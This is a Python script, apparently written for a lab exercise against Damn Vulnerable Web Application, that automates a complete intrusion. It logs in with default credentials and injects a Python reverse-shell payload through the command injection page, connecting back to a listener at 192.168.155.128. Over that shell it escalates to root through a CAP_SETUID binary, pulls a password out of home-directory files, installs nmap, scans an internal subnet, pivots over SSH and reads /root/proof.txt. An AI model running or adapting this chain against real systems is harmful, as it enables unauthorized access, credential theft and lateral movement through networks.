from h_server import hacker_server
import requests
import socket
import re
import time

data = {
	'username':'admin',
	'password':'password',
	'user_token': None,
	'Login':'Login'
}

data_command_injection = {
	'ip': None,
	'Submit':'Submit'
}
sec_level = {
            'security':'low',
            'seclev_submit':'Submit',
            'user_token':None
            }

data_command_injection1 = {'ip': None}

#	r'/bin/sh -i',
commands = [
	#r'/bin/sh -i',
            r'/bin/sh -i',
            r'getcap -r / 2>/dev/null',
            r'whoami',
            r'find /home -name "*.txt"',
            r'cat ',
            r'ifconfig',
            r'apt install nmap',
            r'nmap -p- ',
            r'ssh ',
            r'find /root/proof.txt '
            ]
             
login = 'login.php'

def get_ip():
	sock = socket.socket()
	# хост пустой. сервер будет доступен для всех интерфейсов
	
	sock.bind(('', 80))
	# запустим режим прослушивания. Максимальное кол-во подключений в очереди.
	sock.listen(1)
	#принимаем подключение. Новый сокет, адрес клмента. Данный сокет бцдет исп для приема и посылки клиенту данных
	conn, addr = sock.accept()
	data = 'hello'
	conn.send(data.encode())
	conn.close()
	print('Get new address: ',addr[0])
	
	return(addr)
		
session = requests.Session()
def token(tok):
        return re.search(r"name='user_token' value='(.+)'", tok).group(1)
def connection(address):
	url = 'http://'+ address[0]+ '/DVWA/'
	print(url+login)
	print('\n')
	get_request = session.get(url+login)
	data['user_token'] = token(get_request.text)
	
	post_request = session.post(url+login, data = data)
	
	if 'Welcome to Damn Vulnerable Web Application!' in post_request.text:
		print('...* Logged in DVWA *...')
	else:
		print("...* We can't logging, exit *...")
		exit(-1)
	
def command_injection(address):
#-------------------------------------------------------------
# connecting to server
	global port 
	#print('это адрес сервера и порт, к:', address)
	port = 11200
	url = 'http://'+ address[0] +'/DVWA/'
	print(url)
	sock = socket.socket()
	if sock != None:
		print('...* Its work! Listen *...')
		#print(sock)
	while True:
		try:
			sock.bind(('',address[1]))
			print('\n')
			#print('test command_injection', sock, '      ', address )
			#conn, addr = sock.accept()
			#print('это адрес сервера и порт, к которому подключились :',address[1])
			break
		except:
			#print('Error with binding to {} port. Increment the num of port and retrying...'.format(port))
			port+=1
	sock.listen(1)
	
#------------------------------------------------
# 	reverse_shell
#------------------------------------------------	

	vuln_page = 'vulnerabilities/exec/'
	port = address[1]
	get_request = session.get(url+vuln_page)
	print(url+vuln_page)
	print("...* let's find Command Injection *...")
	#massiv = ['127.0.0.1 && pwd', '127.0.0.1 && ls']
	#for commands in massiv
	data_command_injection['ip'] = '127.0.0.1 && ls'
	post_request= session.post(url+vuln_page, data=data_command_injection)
	#print(post_request.text)
	reverse_shell = ''';python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",int(port)));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")" 192.168.155.128 {}'''.format(port)

	if 'index.php' in post_request.text:
		print(' ...* find command injection *...')
		print('\n')

		data_command_injection['ip'] = '''127.0.0.1; python3 -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.155.128 {}'''.format(port)
				
	while True:
            try:
            	post_request2 = session.post(url+vuln_page, data=data_command_injection, timeout = 10)	
            	print(post_request2.text)
            	break
            except:
            	break#print('timeout. Wait ! ')
	conn, addr = sock.accept()
	text = (conn.recv(1024)).decode()
	conn.send(text.encode())
	time.sleep(2)	
	af = ''		
	cat = []
	index=''
	passwd =''
	print(text)
	net=''
	mass=[]
	new_network=[]
	cod=[]
	for command in range(len(commands)):
		if command == 0:
			tmp = commands[command]+ '\n'
			sending_text = (tmp).encode()
			conn.send(sending_text)
			time.sleep(2)
			ttext = conn.recv(2048).decode()
			text_data = ('cd /' + '\n').encode() 
			conn.send(text_data)
			a=conn.recv(2048).decode()
			time.sleep(2)
			print(a)
			print('\n')
			print("...* Let's try to increase privileges, we will look for. Check for sudo and SUID binary file permissions *...")
			time.sleep(2)
			print('\n')
			
		if command == 1:
			tmp = commands[command]+ '\n'
			sending_text = (tmp).encode()
			conn.send(sending_text)
			time.sleep(12)
			ttext = conn.recv(16384).decode()
			print(ttext)
			print('\n')
			print('...* found a file with CAP_SETUID. We get root *...')
			time.sleep(2)
			print('\n')
			tmp2 = "python3.8 -c "+ "'import os; os.setuid(0); os.system"+'("/bin/bash")'+ "'"+'\n'
			sending_text2 = (tmp2).encode()
			conn.send(sending_text2)
			time.sleep(15)
			ttext2 = conn.recv(32768).decode()
			print(ttext2)

		if command == 2:
			tmp222 = commands[command]+ '\n'
			sending_text222 = (tmp222).encode()
			conn.send(sending_text222)
			time.sleep(3)
			ttext222 = conn.recv(16384).decode()
			print(ttext222)
			print('\n')

		if command == 3:
			tmp = commands[command]+ '\n'
			sending_text = (tmp).encode()
			conn.send(sending_text)
			time.sleep(15)
			ttext = conn.recv(16386).decode()
			index = ttext
			cat.append(index[731:758])
			s = cat[0]
			line= s[1:28]
			print("...* Let's look for interesting text files *...")
			time.sleep(2)
			print(ttext)
			tmp1 = commands[command+1]+ line + '\n'
			sending_text1 = (tmp1).encode()
			conn.send(sending_text1)
			time.sleep(14)
			ttext1 = conn.recv(16386).decode()
			print('\n')
			print(ttext1)
			#passwd=ttext1[30:-15]
			mass.append(ttext1[30:-15])
			#print(mass)
			tmp=mass[0]
			passwd=tmp[2:8]

		# r'ifconfig',
		if command == 5:
			print('root@ubuntu:/# ifconfig')
			print('\n')
			tmp5 = commands[command] + '\n'
			sending_text5 = (tmp5).encode()
			conn.send(sending_text5)
			time.sleep(14)
			ttext5 = conn.recv(16386).decode()
			# vse seti vyvod	
			print(ttext5)
			#print('\n')
			gf=ttext5.find('192.168.144.') #585
			#print(ttext5[585:601])
			net=ttext5[586:601]
			new_network = re.findall(r'\w{1,3}\.\w{1,3}\.\w{1,3}\.\w{1,3}',ttext5)
			print('\n')
			
			print('...* Found new interesting network! ', new_network[3], ' *...')
			time.sleep(1)
		
		# r'apt install nmap',
		if command == 6:
			tmp6 = 'sudo apt install nmap' + '\n'
			sending_text6 = (tmp6).encode()
			conn.send(sending_text6)
			time.sleep(25)
			ttext6 = conn.recv(32768).decode()			
			print(ttext6)
			#print(ttext61)
			print('\n')
	# 		IZMINIT !!!!!!!!!!		
			if 'Processing triggers for man-db' in ttext6:
			 	print('nmap installed')
			 	continue
			elif 'nmap is already the newest version' in ttext6:
		            print('nmap is just installed on remote server')
		            continue
			else:
		            print('Something wen t wrong')
		            exit(-1)
			print('\n')
		if command == 7:
			# new_network add
			tmp7 = commands[command]+  '192.168.144.0-255' +'\n'
			sending_text7 = (tmp7).encode()
			conn.send(sending_text7)
			time.sleep(100)
			ttext7 = conn.recv(2048).decode()
			print(ttext7)
			print('\n')
			new_n = re.findall(r'\w{1,3}\.\w{1,3}\.\w{1,3}\.\w{1,3}',ttext7)
			#192.168.144.129
			print('...* We got new network ', new_n[2], '*...')
			time.sleep(2)
			for dd in range(len(new_n)):
				cod.append(new_n[dd])
		
		if command == 8:
			print('...* Trying to connect via ssh using the found password *...')
			time.sleep(2)
			tmp8 = commands[command]+ cod[2] +'\n'
			sending_text8 = (tmp8).encode()
			conn.send(sending_text8)
			time.sleep(15)
			ttext8 = conn.recv(8192).decode()
			print(ttext8)	
				#tmp81 = 'yes' +'\n'
				#sending_text81 = (tmp81).encode()
				#conn.send(sending_text81)
				#time.sleep(6)
				#ttext81 = conn.recv(4096).decode()
				#print(ttext81)
				
				# add password
					#tmp82 = 'root' +'\n'
			tmp82 = passwd +'\n'
			sending_text82 = (tmp82).encode()
			conn.send(sending_text82)
			time.sleep(6)
			ttext82 = conn.recv(4096).decode()
			print(ttext82)
			
		if command == 9:
			tmp9 = commands[command]+'\n'
			sending_text9 = (tmp9).encode()
			conn.send(sending_text9)
			time.sleep(6)
			ttext9 = conn.recv(4096).decode()
			print(ttext9)
			print('\n')
	# commands		
			tmp91 = 'cat /root/proof.txt'+'\n'
			sending_text91 = (tmp91).encode()
			conn.send(sending_text91)
			time.sleep(6)
			ttext91 = conn.recv(4096).decode()
			print(ttext91)

def main():
	address = get_ip()
	#aaddr = hacker_server()
	#connection_to_server(address)
	connection(address)
	command_injection(address)

if __name__ == '__main__':
	main()
